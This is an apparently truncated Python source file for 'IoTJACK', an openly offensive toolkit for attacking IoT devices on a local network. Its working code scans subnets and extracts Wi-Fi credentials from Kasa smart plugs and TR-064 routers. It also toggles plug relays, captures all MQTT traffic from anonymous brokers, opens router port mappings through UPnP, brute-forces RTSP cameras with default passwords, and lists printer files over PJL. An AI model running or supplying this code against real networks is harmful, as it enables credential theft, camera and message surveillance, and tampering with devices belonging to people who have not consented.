#!/usr/bin/env python3
# IoTJACK engine - IoT exploitation toolkit for the WiFi Pineapple Pager.
# Pure stdlib (python3-light). No external packages.
#
# Modules: Kasa, MQTT, UPnP/IGD, TR-064, RTSP, PJL.
# Read/loot actions are the default; anything that changes a device is a
# separate, explicit action (payload.sh gates those behind confirmations).
import argparse
import base64
import concurrent.futures
import hashlib
import http.client
import ipaddress
import json
import os
import random
import re
import signal
import socket
import struct
import sys
import threading
import time

VERSION = "1.0.0"
STOP = threading.Event()

# Ports probed during discovery. "fast" is the IoT-heavy shortlist.
PORTS_FULL = [23, 22, 53, 80, 81, 443, 554, 631, 1883, 5000, 7000, 7547,
              8008, 8009, 8080, 8081, 8291, 8443, 8883, 9100, 9999, 37777]
PORTS_FAST = [23, 80, 554, 1883, 7547, 8080, 8291, 9100, 9999, 37777]

KASA_PORT = 9999
MQTT_PORT = 1883
TR064_PORT = 7547
RTSP_PORT = 554
PJL_PORT = 9100

RTSP_CREDS = [
    ("admin", "admin"), ("admin", "12345"), ("admin", ""), ("root", "root"),
    ("root", "12345"), ("admin", "admin123"), ("user", "user"),
    ("operator", "operator"),
]


def safe_int(value, default=0):
    try:
        return int(str(value).strip())
    except (TypeError, ValueError):
        return default


def decode_text(data, limit=4096):
    if not data:
        return ""
    if isinstance(data, str):
        return data[:limit]
    return data[:limit].decode("utf-8", "replace")


def now_iso():
    return time.strftime("%Y-%m-%dT%H:%M:%S%z", time.localtime())


def http_date():
    return time.strftime("%a, %d %b %Y %H:%M:%S GMT", time.gmtime())


# ---------------------------------------------------------------------------
# loot
# ---------------------------------------------------------------------------

class Loot(object):
    def __init__(self, path, quiet=False):
        self.path = path
        self.quiet = quiet
        os.makedirs(self.path, exist_ok=True)
        self.events_path = os.path.join(path, "events.jsonl")
        self.ui_path = os.path.join(path, "ui.log")
        self._lock = threading.Lock()

    def event(self, kind, **data):
        rec = {"ts": now_iso(), "kind": kind}
        rec.update(data)
        line = json.dumps(rec, ensure_ascii=False)
        with self._lock:
            try:
                with open(self.events_path, "a", encoding="utf-8") as f:
                    f.write(line + "\n")
            except OSError:
                pass

    def ui(self, msg):
        line = "[%s] %s" % (time.strftime("%H:%M:%S"), msg)
        with self._lock:
            try:
                with open(self.ui_path, "a", encoding="utf-8") as f:
                    f.write(line + "\n")
            except OSError:
                pass
        if not self.quiet:
            print(line, flush=True)

    def save(self, name, text):
        path = os.path.join(self.path, name)
        try:
            with open(path, "a", encoding="utf-8") as f:
                f.write(text if text.endswith("\n") else text + "\n")
        except OSError:
            pass
        return path


# ---------------------------------------------------------------------------
# generic TCP / HTTP helpers
# ---------------------------------------------------------------------------

def tcp_probe(ip, port, timeout=0.6):
    """Return True if a TCP connection to ip:port succeeds."""
    try:
        s = socket.create_connection((ip, port), timeout=timeout)
        s.close()
        return True
    except OSError:
        return False


def tcp_exchange(ip, port, payload, timeout=3.0, read_time=1.2, max_read=65536):
    """Send payload, then read whatever comes back until read_time expires."""
    s = socket.create_connection((ip, port), timeout=timeout)
    s.settimeout(read_time)
    try:
        s.sendall(payload)
    except OSError:
        s.close()
        return b""
    data = b""
    try:
        while len(data) < max_read:
            chunk = s.recv(min(8192, max_read - len(data)))
            if not chunk:
                break
            data += chunk
    except OSError:
        pass
    s.close()
    return data


def recv_exact(sock, n):
    data = b""
    while len(data) < n:
        try:
            chunk = sock.recv(n - len(data))
        except OSError:
            return None
        if not chunk:
            return None
        data += chunk
    return data


def parse_url(url):
    if url.startswith("https://"):
        scheme, rest = "https", url[8:]
    elif url.startswith("http://"):
        scheme, rest = "http", url[7:]
    else:
        scheme, rest = "http", url
    if "/" in rest:
        hostport, path = rest.split("/", 1)
        path = "/" + path
    else:
        hostport, path = rest, "/"
    if ":" in hostport:
        host, port_s = hostport.rsplit(":", 1)
        port = safe_int(port_s, 443 if scheme == "https" else 80)
    else:
        host, port = hostport, (443 if scheme == "https" else 80)
    return scheme, host, port, path or "/"


def http_request(url, method="GET", body=None, headers=None, timeout=6,
                 max_read=262144):
    scheme, host, port, path = parse_url(url)
    conn = http.client.HTTPConnection(host, port, timeout=timeout)
    try:
        conn.request(method, path, body=body, headers=headers or {})
        resp = conn.getresponse()
        data = resp.read(max_read)
        return resp.status, dict(resp.getheaders()), data
    finally:
        conn.close()


def parse_http_headers(data):
    text = data.decode("utf-8", "replace")
    lines = text.replace("\r\n", "\n").split("\n")
    first = lines[0].strip() if lines else ""
    headers = {}
    for line in lines[1:]:
        if ":" in line:
            k, v = line.split(":", 1)
            headers[k.strip().lower()] = v.strip()
    return first, headers


def iface_ip(iface):
    import fcntl
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        req = struct.pack("256s", iface.encode("utf-8")[:15])
        res = fcntl.ioctl(s.fileno(), 0x8915, req)  # SIOCGIFADDR
        return socket.inet_ntoa(res[20:24])
    except OSError:
        return None
    finally:
        s.close()


def iface_list():
    out = []
    for idx, name in socket.if_nameindex():
        ip = iface_ip(name)
        if ip and not ip.startswith("127."):
            out.append((name, ip))
    return out


def subnet_hosts(ip, cidr):
    net = ipaddress.ip_network("%s/%s" % (ip, cidr), strict=False)
    hosts = [str(h) for h in net.hosts()]
    if len(hosts) > 1022:
        hosts = hosts[:1022]
    return hosts


# ---------------------------------------------------------------------------
# TP-Link Kasa (XOR protocol, TCP 9999, unauthenticated on legacy firmware)
# ---------------------------------------------------------------------------

def kasa_enc(data):
    key = 171
    out = bytearray()
    for b in data:
        c = b ^ key
        key = c
        out.append(c)
    return bytes(out)


def kasa_dec(data):
    key = 171
    out = bytearray()
    for c in data:
        p = c ^ key
        key = c
        out.append(p)
    return bytes(out)


def kasa_cmd(ip, port, obj, timeout=6):
    payload = json.dumps(obj).encode("utf-8")
    pkt = struct.pack(">I", len(payload)) + kasa_enc(payload)
    s = socket.create_connection((ip, port), timeout=timeout)
    s.settimeout(timeout)
    try:
        s.sendall(pkt)
        hdr = recv_exact(s, 4)
        if not hdr:
            raise OSError("no response header")
        length = struct.unpack(">I", hdr)[0]
        if length <= 0 or length > 1024 * 1024:
            raise OSError("bad response length %d" % length)
        data = recv_exact(s, length)
        if data is None:
            raise OSError("short response")
    finally:
        s.close()
    return json.loads(kasa_dec(data).decode("utf-8", "replace"))


def kasa_probe(ip, port=KASA_PORT):
    """Return sysinfo dict if the device answers the Kasa protocol."""
    try:
        res = kasa_cmd(ip, port, {"system": {"get_sysinfo": {}}}, timeout=3)
    except Exception:
        return None
    info = res.get("system", {}).get("get_sysinfo", {})
    if not info or "err_code" not in info:
        return None
    return info


def kasa_action(ip, port, action, state=None):
    if action == "sysinfo":
        res = kasa_cmd(ip, port, {"system": {"get_sysinfo": {}}})
        return res.get("system", {}).get("get_sysinfo", {})
    if action == "creds":
        res = kasa_cmd(ip, port, {"netif": {"get_stainfo": {}}})
        return res.get("netif", {}).get("get_stainfo", {})
    if action == "cloud":
        res = kasa_cmd(ip, port, {"cnCloud": {"get_info": {}}})
        return res.get("cnCloud", {}).get("get_info", {})
    if action == "emeter":
        res = kasa_cmd(ip, port, {"emeter": {"get_realtime": {}}})
        return res.get("emeter", {}).get("get_realtime", {})
    if action == "relay":
        if state == "toggle":
            info = kasa_action(ip, port, "sysinfo")
            cur = safe_int(info.get("relay_state", 0), 0)
            state = "off" if cur else "on"
        want = 1 if state == "on" else 0
        res = kasa_cmd(ip, port, {"system": {"set_relay_state": {"state": want}}})
        out = res.get("system", {}).get("set_relay_state", {})
        out["requested_state"] = state
        return out
    raise ValueError("unknown kasa action %s" % action)


# ---------------------------------------------------------------------------
# MQTT (minimal 3.1.1 client: connect, subscribe, publish, ping)
# ---------------------------------------------------------------------------

def _mqtt_varint(n):
    out = bytearray()
    while True:
        b = n % 128
        n //= 128
        if n:
            out.append(b | 0x80)
        else:
            out.append(b)
            break
    return bytes(out)


def _mqtt_str(s):
    b = s.encode("utf-8")
    return struct.pack(">H", len(b)) + b


def mqtt_packet(ptype_flags, body):
    return bytes([ptype_flags]) + _mqtt_varint(len(body)) + body


def mqtt_connect_packet(client_id, username=None, password=None, keepalive=60):
    flags = 0x02  # clean session
    if username is not None:
        flags |= 0x80
        if password is not None:
            flags |= 0x40
    body = _mqtt_str("MQTT") + bytes([4, flags]) + struct.pack(">H", keepalive)
    body += _mqtt_str(client_id)
    if username is not None:
        body += _mqtt_str(username)
        if password is not None:
            body += _mqtt_str(password)
    return mqtt_packet(0x10, body)


def mqtt_read_packet(sock):
    hdr = recv_exact(sock, 1)
    if not hdr:
        return None
    ptype = hdr[0]
    mult = 1
    remaining = 0
    for _ in range(4):
        b = recv_exact(sock, 1)
        if not b:
            return None
        remaining += (b[0] & 0x7F) * mult
        if not (b[0] & 0x80):
            break
        mult *= 128
    if remaining > 2 * 1024 * 1024:
        return None
    body = recv_exact(sock, remaining) if remaining else b""
    if body is None:
        return None
    return ptype, body


def mqtt_connect(ip, port, username=None, password=None, timeout=5):
    """Open a connection and complete the MQTT handshake. Returns (sock, rc)."""
    s = socket.create_connection((ip, port), timeout=timeout)
    s.settimeout(timeout)
    cid = "iotjack-%06x" % random.getrandbits(24)
    s.sendall(mqtt_connect_packet(cid, username, password))
    pkt = mqtt_read_packet(s)
    if not pkt or pkt[0] >> 4 != 2:  # CONNACK
        s.close()
        raise OSError("no CONNACK")
    rc = pkt[1][1] if len(pkt[1]) >= 2 else 3
    if rc != 0:
        s.close()
        return None, rc
    return s, 0


def mqtt_probe(ip, port=MQTT_PORT):
    """Check whether the broker allows anonymous access."""
    try:
        s, rc = mqtt_connect(ip, port, timeout=4)
    except OSError as exc:
        return {"status": 0, "error": str(exc)}
    if s is None:
        return {"status": 0, "anon": False, "rc": rc,
                "note": "authentication required (rc=%d)" % rc}
    try:
        s.sendall(mqtt_packet(0xE0, b""))  # DISCONNECT
    except OSError:
        pass
    s.close()
    return {"status": 1, "anon": True, "rc": 0}


def mqtt_parse_publish(ptype, body):
    if len(body) < 2:
        return None
    tlen = struct.unpack(">H", body[:2])[0]
    topic = decode_text(body[2:2 + tlen], 512)
    off = 2 + tlen
    qos = (ptype >> 1) & 0x03
    pkt_id = None
    if qos:
        if off + 2 > len(body):
            return None
        pkt_id = struct.unpack(">H", body[off:off + 2])[0]
        off += 2
    return topic, body[off:], qos, pkt_id


def mqtt_capture(ip, port, seconds, loot, username=None, password=None,
                 max_msgs=500):
    """Subscribe to # and record messages until the deadline."""
    s, rc = mqtt_connect(ip, port, username, password, timeout=5)
    if s is None:
        return {"status": 0, "anon": False, "rc": rc, "messages": 0}
    sub = struct.pack(">H", 1) + _mqtt_str("#") + bytes([0])
    s.sendall(mqtt_packet(0x82, sub))
    deadline = time.time() + max(2, seconds)
    count = 0
    topics = set()
    last_ping = time.time()
    s.settimeout(1.0)
    while time.time() < deadline and count < max_msgs and not STOP.is_set():
        try:
            pkt = mqtt_read_packet(s)
        except OSError:
            break
        if not pkt:
            pkt = None
        if pkt is None and time.time() - last_ping > 25:
            try:
                s.sendall(mqtt_packet(0xC0, b""))
                last_ping = time.time()
            except OSError:
                break
        if not pkt:
            continue
        ptype, body = pkt
        kind = ptype >> 4
        if kind == 3:  # PUBLISH
            parsed = mqtt_parse_publish(ptype, body)
            if not parsed:
                continue
            topic, payload, qos, pkt_id = parsed
            if qos == 1 and pkt_id:
                try:
                    s.sendall(mqtt_packet(0x40, struct.pack(">H", pkt_id)))
                except OSError:
                    break
            topics.add(topic)
            count += 1
            loot.event("mqtt_msg", src=ip, topic=topic,
                       payload=decode_text(payload, 1024))
            loot.save("mqtt_%s.jsonl" % ip.replace(".", "_"),
                      json.dumps({"ts": now_iso(), "topic": topic,
                                  "payload": decode_text(payload, 1024)},
                                 ensure_ascii=False))
        elif kind == 13:  # PINGRESP
            continue
        elif kind == 9:  # SUBACK
            continue
    try:
        s.sendall(mqtt_packet(0xE0, b""))
    except OSError:
        pass
    s.close()
    return {"status": 1, "anon": True, "messages": count,
            "topics": sorted(topics)[:200]}


def mqtt_publish(ip, port, topic, payload, username=None, password=None):
    s, rc = mqtt_connect(ip, port, username, password, timeout=5)
    if s is None:
        return {"status": 0, "rc": rc, "error": "connect/auth failed"}
    try:
        body = _mqtt_str(topic) + payload.encode("utf-8")
        s.sendall(mqtt_packet(0x30, body))
        s.sendall(mqtt_packet(0xE0, b""))
    finally:
        s.close()
    return {"status": 1, "topic": topic, "bytes": len(payload)}


# ---------------------------------------------------------------------------
# SOAP / UPnP IGD / TR-064
# ---------------------------------------------------------------------------

def soap_call(host, port, path, service_type, action, args=None, timeout=6):
    """Minimal SOAP 1.1 call. Returns (ok, {NewTag: value} or {'error': ...})."""
    inner = ""
    for k, v in (args or {}).items():
        inner += "<%s>%s</%s>" % (k, v, k)
    envelope = ("<?xml version=\"1.0\"?>\n"
                "<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\""
                " s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
                "<s:Body><u:%s xmlns:u=\"%s\">%s</u:%s>"
                "</s:Body></s:Envelope>" % (action, service_type, inner, action))
    url = "http://%s:%d%s" % (host, port, path)
    headers = {
        "Content-Type": "text/xml; charset=\"utf-8\"",
        "SOAPACTION": "\"%s#%s\"" % (service_type, action),
    }
    try:
        status, _, data = http_request(url, "POST", envelope, headers, timeout)
    except Exception as exc:
        return False, {"error": str(exc)}
    text = decode_text(data, 131072)
    out = {}
    for m in re.finditer(r"<(New[A-Za-z0-9]+)[^>]*>(.*?)</\1>", text, re.S):
        out[m.group(1)] = re.sub(r"<[^>]+>", "", m.group(2)).strip()
    if status == 200:
        return True, out
    code = re.search(r"<errorCode>([^<]+)</errorCode>", text)
    desc = re.search(r"<errorDescription>([^<]+)</errorDescription>", text)
    if code or desc:
        out["error"] = "%s %s" % (code.group(1) if code else status,
                                  desc.group(1) if desc else "")
    else:
        out["error"] = "HTTP %s" % status
    return False, out


SSDP_ADDR = "239.255.255.250"
SSDP_PORT = 1900


def ssdp_discover(ip, st, seconds=3):
    """Return [{'ip','port','location','server','st','usn'}...] for a search."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sock.bind(("", 0))
    except OSError:
        sock.close()
        return []
    try:
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_IF,
                        socket.inet_aton(ip))
    except OSError:
        pass
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
    sock.settimeout(0.5)
    msg = ("M-SEARCH * HTTP/1.1\r\nHOST: %s:%d\r\nMAN: \"ssdp:discover\"\r\n"
           "MX: 2\r\nST: %s\r\nUSER-AGENT: IoTJACK/%s\r\n\r\n"
           % (SSDP_ADDR, SSDP_PORT, st, VERSION))
    deadline = time.time() + seconds
    found = {}
    while time.time() < deadline and not STOP.is_set():
        try:
            sock.sendto(msg.encode(), (SSDP_ADDR, SSDP_PORT))
        except OSError:
            pass
        end = time.time() + 0.8
        while time.time() < end:
            try:
                data, addr = sock.recvfrom(9000)
            except socket.timeout:
                break
            except OSError:
                break
            first, headers = parse_http_headers(data)
            if "200" not in first:
                continue
            location = headers.get("location", "")
            if not location:
                continue
            try:
                _, host, port, _ = parse_url(location)
            except Exception:
                continue
            key = (host, port, location)
            found[key] = {"ip": host, "port": port, "location": location,
                          "server": headers.get("server", ""),
                          "st": headers.get("st", st),
                          "usn": headers.get("usn", "")}
    sock.close()
    return list(found.values())


IGD_SERVICES = ["urn:schemas-upnp-org:service:WANIPConnection:1",
                "urn:schemas-upnp-org:service:WANPPPConnection:1"]


def igd_find_service(desc_xml, base_url):
    """Extract (service_type, absolute control URL) for an IGD service."""
    for block in re.findall(r"<service>(.*?)</service>", desc_xml, re.I | re.S):
        for svc in IGD_SERVICES:
            if svc in block:
                m = re.search(r"<controlURL[^>]*>(.*?)</controlURL>",
                              block, re.I | re.S)
                if not m:
                    continue
                path = m.group(1).strip()
                scheme, host, port, base_path = parse_url(base_url)
                if path.startswith("http"):
                    return svc, path
                if not path.startswith("/"):
                    path = "/" + path
                return svc, "http://%s:%d%s" % (host, port, path)
    return None, None


def igd_discover(iface_ip_addr, seconds=3):
    """Find IGDs and their control URLs."""
    out = []
    seen = set()
    for st in (["urn:schemas-upnp-org:device:InternetGatewayDevice:1"] +
                IGD_SERVICES):
        for dev in ssdp_discover(iface_ip_addr, st, seconds):
            if dev["location"] in seen:
                continue
            seen.add(dev["location"])
            try:
                status, _, body = http_request(dev["location"], timeout=4)
            except Exception:
                continue
            if status != 200:
                continue
            xml = decode_text(body)
            svc, ctrl = igd_find_service(xml, dev["location"])
            if ctrl:
                dev["service"] = svc
                dev["control_url"] = ctrl
                name = re.search(r"<friendlyName[^>]*>(.*?)</friendlyName>",
                                 xml, re.I | re.S)
                model = re.search(r"<modelName[^>]*>(.*?)</modelName>",
                                  xml, re.I | re.S)
                dev["name"] = re.sub(r"<[^>]+>", "", name.group(1)).strip() if name else ""
                dev["model"] = re.sub(r"<[^>]+>", "", model.group(1)).strip() if model else ""
                out.append(dev)
    return out


def igd_enum(host, port, control_url):
    """List external IP and existing port mappings."""
    _, _, _, path = parse_url(control_url)
    svc_type = IGD_SERVICES[0]
    for svc in IGD_SERVICES:
        ok, res = soap_call(host, port, path, svc, "GetExternalIPAddress")
        if ok:
            svc_type = svc
            break
    result = {"external_ip": res.get("NewExternalIPAddress", "") if ok else "",
              "mappings": [], "service": svc_type}
    for i in range(64):
        ok, entry = soap_call(host, port, path, svc_type,
                              "GetGenericPortMappingEntry",
                              {"NewPortMappingIndex": i})
        if not ok:
            break
        result["mappings"].append({
            "index": i,
            "ext_port": entry.get("NewExternalPort", ""),
            "proto": entry.get("NewProtocol", ""),
            "int_port": entry.get("NewInternalPort", ""),
            "client": entry.get("NewInternalClient", ""),
            "enabled": entry.get("NewEnabled", ""),
            "desc": entry.get("NewPortMappingDescription", ""),
        })
    return result


def igd_add_mapping(host, port, control_url, ext_port, int_port, client,
                    proto, desc, svc_type):
    _, _, _, path = parse_url(control_url)
    if not desc.startswith("IoTJACK"):
        desc = "IoTJACK %s" % desc
    return soap_call(host, port, path, svc_type, "AddPortMapping", {
        "NewRemoteHost": "", "NewExternalPort": ext_port,
        "NewProtocol": proto.upper(), "NewInternalPort": int_port,
        "NewInternalClient": client, "NewEnabled": 1,
        "NewPortMappingDescription": desc, "NewLeaseDuration": 0})


def igd_del_mapping(host, port, control_url, ext_port, proto, svc_type):
    _, _, _, path = parse_url(control_url)
    return soap_call(host, port, path, svc_type, "DeletePortMapping", {
        "NewRemoteHost": "", "NewExternalPort": ext_port,
        "NewProtocol": proto.upper()})


def tr064_probe(ip, port=TR064_PORT):
    """Try the common TR-064 endpoints for device info and Wi-Fi keys."""
    result = {"status": 0, "info": {}, "keys": {}, "auth_required": False}
    info_svc = "urn:dslforum-org:service:DeviceInfo:1"
    wlan_svc = "urn:dslforum-org:service:WLANConfiguration:1"
    for path in ("/tr064", "/upnp/control/deviceinfo"):
        ok, res = soap_call(ip, port, path, info_svc, "GetInfo")
        if ok:
            result["info"] = res
            result["status"] = 1
            break
        if "401" in res.get("error", "") or "auth" in res.get("error", "").lower():
            result["auth_required"] = True
    for path in ("/tr064", "/upnp/control/wlanconfig"):
        ok, res = soap_call(ip, port, path, wlan_svc, "GetSecurityKeys")
        if ok:
            result["keys"] = res
            result["status"] = 1
            break
        if "401" in res.get("error", "") or "auth" in res.get("error", "").lower():
            result["auth_required"] = True
    if result["auth_required"] and result["status"] == 0:
        result["error"] = "HTTP 401 - authentication required"
    return result


# ---------------------------------------------------------------------------
# RTSP (OPTIONS/DESCRIBE, Basic + Digest auth, small default-cred list)
# ---------------------------------------------------------------------------

def rtsp_request(ip, port, method, path, headers=None, timeout=5,
                 max_read=16384):
    url = "rtsp://%s:%d%s" % (ip, port, path)
    lines = ["%s %s RTSP/1.0" % (method, url),
             "CSeq: %d" % random.randint(1, 99),
             "User-Agent: IoTJACK/%s" % VERSION]
    if method == "DESCRIBE":
        lines.append("Accept: application/sdp")
    for k, v in (headers or {}).items():
        lines.append("%s: %s" % (k, v))
    payload = ("\r\n".join(lines) + "\r\n\r\n").encode("utf-8")
    data = tcp_exchange(ip, port, payload, timeout=timeout,
                        read_time=1.0, max_read=max_read)
    first, hdrs = parse_http_headers(data)
    m = re.match(r"RTSP/1\.\d\s+(\d+)", first)
    status = safe_int(m.group(1), 0) if m else 0
    body = b""
    idx = data.find(b"\r\n\r\n")
    if idx >= 0:
        body = data[idx + 4:]
    return status, hdrs, body


def rtsp_digest_header(method, uri, challenge, user, password):
    """Build a Digest Authorization header from a WWW-Authenticate value."""
    params = dict(re.findall(r'(\w+)="?([^",]+)"?', challenge))
    realm = params.get("realm", "")
    nonce = params.get("nonce", "")
    qop = params.get("qop", "")
    if "," in qop:
        qop = "auth"
    ha1 = hashlib.md5(("%s:%s:%s" % (user, realm, password)).encode()).hexdigest()
    ha2 = hashlib.md5(("%s:%s" % (method, uri)).encode()).hexdigest()
    if qop:
        nc = "00000001"
        cnonce = "%08x" % random.getrandbits(32)
        resp = hashlib.md5(("%s:%s:%s:%s:%s:%s" % (ha1, nonce, nc, cnonce,
                                                   qop, ha2)).encode()).hexdigest()
        return ('Digest username="%s", realm="%s", nonce="%s", uri="%s", '
                'response="%s", qop=%s, nc=%s, cnonce="%s"'
                % (user, realm, nonce, uri, resp, qop, nc, cnonce))
    resp = hashlib.md5(("%s:%s:%s" % (ha1, nonce, ha2)).encode()).hexdigest()
    return ('Digest username="%s", realm="%s", nonce="%s", uri="%s", '
            'response="%s"' % (user, realm, nonce, uri))


def rtsp_probe(ip, port=RTSP_PORT, path="/"):
    """Try unauthenticated, then default creds (Basic and Digest)."""
    result = {"status": 0, "server": "", "auth": "unknown",
              "working_creds": [], "streams": []}
    try:
        status, hdrs, body = rtsp_request(ip, port, "DESCRIBE", path)
    except OSError as exc:
        result["error"] = str(exc)
        return result
    result["server"] = hdrs.get("server", "")
    if status == 200:
        result["status"] = 1
        result["auth"] = "none"
        result["streams"] = re.findall(r"a=control:([^\r\n]+)",
                                       decode_text(body))[:8]
        return result
    if status != 401:
        result["auth"] = "http-%d" % status
        return result
    challenge = hdrs.get("www-authenticate", "")
    scheme = "digest" if challenge.lower().startswith("digest") else "basic"
    result["auth"] = scheme
    uri = "rtsp://%s:%d%s" % (ip, port, path)
    for user, password in RTSP_CREDS:
        if scheme == "digest":
            auth = rtsp_digest_header("DESCRIBE", uri, challenge, user, password)
        else:
            auth = "Basic " + base64.b64encode(
                ("%s:%s" % (user, password)).encode()).decode()
        try:
            st, hd, bd = rtsp_request(ip, port, "DESCRIBE", path,
                                      {"Authorization": auth})
        except OSError:
            break
        if st == 200:
            result["status"] = 1
            result["working_creds"].append("%s:%s" % (user, password))
            result["streams"] = re.findall(r"a=control:([^\r\n]+)",
                                           decode_text(bd))[:8]
            if not result["server"]:
                result["server"] = hd.get("server", "")
            break
    if result["status"] == 0:
        result["note"] = "no default creds worked"
    return result


# ---------------------------------------------------------------------------
# PJL (port 9100 printers)
# ---------------------------------------------------------------------------

PJL_UEL = b"\x1b%-12345X"


def pjl_cmd(ip, port, commands, timeout=4, read_time=1.6):
    payload = PJL_UEL + "".join("@PJL %s\r\n" % c for c in commands).encode() + PJL_UEL
    return decode_text(tcp_exchange(ip, port, payload, timeout=timeout,
                                    read_time=read_time), 32768)


def pjl_probe(ip, port=PJL_PORT):
    try:
        out = pjl_cmd(ip, port, ["INFO ID"], timeout=3, read_time=1.2)
    except OSError:
        return None
    out = out.strip()
    return out if out else None


def pjl_action(ip, port, action, message=""):
    if action == "id":
        return {"id": pjl_cmd(ip, port, ["INFO ID"])}
    if action == "status":
        return {"status_raw": pjl_cmd(ip, port, ["INFO STATUS"])}
    if action == "config":
        return {"config": pjl_cmd(ip, port, ["INFO CONFIG"])}
    if action == "ls":
        raw = pjl_cmd(ip, port, ['FSDIRLIST NAME="0:\\" ENTRY=1 COUNT=50'])
        files = []
        for line in raw.splitlines():
            m = re.match(r"\s*(\S+)\s+TYPE=(\w+)(?:\s+SIZE=(\d+))?", line)
            if m:
                files.append({"name": m.group(1), "type": m.group(2),
                              "size": safe_int(m.group(3), 0)})
        return {"files": files, "raw": decode_text(raw, 2048)}
    if action == "display":
        msg = message[:32]
        pjl_cmd(ip, port, ['RDYMSG DISPLAY = "%s"' % msg], read_time=0.8)
        return {"displayed": msg}
    raise ValueError("unknown pjl action %s" % action)


# ---------------------------------------------------------------------------
# discovery / fingerprint
# ---------------------------------------------------------------------------

def http_title(ip, port):
    try:
        status, hdrs, body = http_request("http://%s:%d/" % (ip, port),
                                          timeout=2)
    except Exception:
        return "", ""
    server = hdrs.get("Server", "") or hdrs.get("server", "")
    text = decode_text(body, 65536)
    m = re.search(r"<title[^>]*>(.*?)</title>", text, re.I | re.S)
    title = re.sub(r"\s+", " ", m.group(1)).strip()[:120] if m else ""
    return title, server


def fingerprint_host(ip, open_ports, timeout=3):
    """Run protocol probes against a host with open ports."""
    dev = {"ip": ip, "ports": open_ports, "kind": "unknown",
           "name": "", "detail": ""}

    if KASA_PORT in open_ports:
        info = kasa_probe(ip)
        if info:
            dev["kind"] = "kasa"
            dev["name"] = info.get("alias", "")
            dev["detail"] = "%s %s" % (info.get("model", ""),
                                       info.get("type", ""))
            dev["kasa"] = {"model": info.get("model", ""),
                           "alias": info.get("alias", ""),
                           "mac": info.get("mac", ""),
                           "relay_state": info.get("relay_state")}
            return dev

    if MQTT_PORT in open_ports:
        probe = mqtt_probe(ip)
        dev["mqtt"] = probe
        if probe.get("anon"):
            dev["kind"] = "mqtt"
            dev["name"] = "MQTT broker (anonymous)"
            dev["detail"] = "open broker, no auth"
            return dev

    if TR064_PORT in open_ports:
        ok_title, _ = http_title(ip, TR064_PORT)
        res = tr064_probe(ip)
        dev["tr064"] = {"auth_required": res.get("auth_required", False),
                        "has_keys": bool(res.get("keys"))}
        if res.get("keys") or res.get("info"):
            dev["kind"] = "router"
            dev["name"] = res.get("info", {}).get("NewModelName", "") or "TR-064 gateway"
            dev["detail"] = "TR-064 exposed"
            return dev

    if RTSP_PORT in open_ports:
        try:
            status, hdrs, _ = rtsp_request(ip, RTSP_PORT, "OPTIONS", "/")
            dev["rtsp_server"] = hdrs.get("server", "")
            dev["kind"] = "camera"
            dev["name"] = hdrs.get("server", "") or "RTSP device"
            dev["detail"] = "RTSP on 554"
            return dev
        except OSError:
            pass

    if PJL_PORT in open_ports:
        ident = pjl_probe(ip)
        if ident:
            dev["kind"] = "printer"
            dev["name"] = ident.splitlines()[0][:60]
            dev["detail"] = "PJL on 9100"
            return dev

    if 8291 in open_ports:
        dev["kind"] = "router"
        dev["name"] = "MikroTik (Winbox)"
        dev["detail"] = "port 8291 open"
        return dev

    if 37777 in open_ports:
        dev["kind"] = "camera"
        dev["name"] = "Dahua/XM device"
        dev["detail"] = "port 37777 open"
        return dev

    for port in (80, 8080, 8081, 81, 443, 8443):
        if port in open_ports and not port == TR064_PORT:
            title, server = http_title(ip, port)
            if title or server:
                dev["kind"] = "web"
                dev["name"] = title or server
                dev["detail"] = "http on %d" % port
                low = (title + " " + server).lower()
                if any(k in low for k in ("router", "gateway", "modem", "fritz",
                                          "openwrt", "asus", "netgear", "mikrotik")):
                    dev["kind"] = "router"
                if any(k in low for k in ("cam", "nvr", "dvr", "ipc")):
                    dev["kind"] = "camera"
                if any(k in low for k in ("printer", "laserjet", "inkjet",
                                          "officejet", "epson", "brother")):
                    dev["kind"] = "printer"
                return dev

    if 22 in open_ports or 23 in open_ports:
        dev["kind"] = "linux-device"
        dev["detail"] = "ssh/telnet open"
    return dev


def scan_network(ip, cidr, ports, workers=96, timeout=0.6, progress=None):
    """TCP connect scan of the subnet, then fingerprint live hosts."""
    hosts = subnet_hosts(ip, cidr)
    open_map = {}
    tasks = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as pool:
        for host in hosts:
            for port in ports:
                tasks.append(pool.submit(tcp_probe, host, port, timeout))
        done = 0
        total = len(tasks)
        for (host, port), fut in zip(
                [(h, p) for h in hosts for p in ports], tasks):
            if STOP.is_set():
                break
            try:
                ok = fut.result()
            except Exception:
                ok = False
            if ok:
                open_map.setdefault(host, []).append(port)
            done += 1
            if progress and done % 400 == 0:
                progress(done, total)
    devices = []
    live = sorted(open_map.keys(),
                  key=lambda h: [int(o) for o in h.split(".")])
    with concurrent.futures.ThreadPoolExecutor(max_workers=24) as pool:
        futs = {pool.submit(fingerprint_host, h, open_map[h]): h for h in live}
        for fut in concurrent.futures.as_completed(futs):
            if STOP.is_set():
                break
            try:
                devices.append(fut.result())
            except Exception:
                pass
    devices.sort(key=lambda d: [int(o) for o in d["ip"].split(".")])
    return devices


# ---------------------------------------------------------------------------
# output helpers
# ---------------------------------------------------------------------------

def print_kv(d, indent=2):
    pad = " " * indent
    for k, v in d.items():
        if isinstance(v, dict):
            print("%s%s:" % (pad, k), flush=True)
            print_kv(v, indent + 2)
        elif isinstance(v, list):
            if v and isinstance(v[0], dict):
                print("%s%s:" % (pad, k), flush=True)
                for item in v:
                    print_kv(item, indent + 2)
                    print(flush=True)
            else:
                print("%s%s: %s" % (pad, k, ", ".join(str(x) for x in v)),
                      flush=True)
        else:
            print("%s%s: %s" % (pad, k, v), flush=True)


# ---------------------------------------------------------------------------
# modes
# ---------------------------------------------------------------------------

def mode_scan(args):
    ip = iface_ip(args.iface)
    if not ip:
        print("Interface %s has no IPv4 address" % args.iface, flush=True)
        return 1
    loot = Loot(args.loot, quiet=args.json)
    ports = PORTS_FAST if args.profile == "fast" else PORTS_FULL

    def progress(done, total):
        if not args.json:
